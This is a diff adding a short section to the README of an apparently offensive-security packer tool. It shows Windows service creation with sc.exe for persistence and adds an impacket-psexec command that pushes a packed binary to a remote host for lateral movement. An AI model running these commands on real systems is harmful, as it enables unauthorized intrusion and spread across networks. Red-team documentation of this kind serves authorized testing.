@@ -314,6 +314,12 @@ sc.exe create Updater binpath="C:\windows\system32\service.exe"
 sc.exe start Updater
 ```
 
+The Packer binaries can also be used for impacket-psexec Lateral Movement:
+
+```
+impacket-psexec muster.local/admin:password@IP -c service.exe -remote-binary-name service.exe -service-name lateralmovement
+```
+
 Service DLLs need additional configurations. You can read [the following blog](https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain) and need some Registry changes:
 
 ```batch
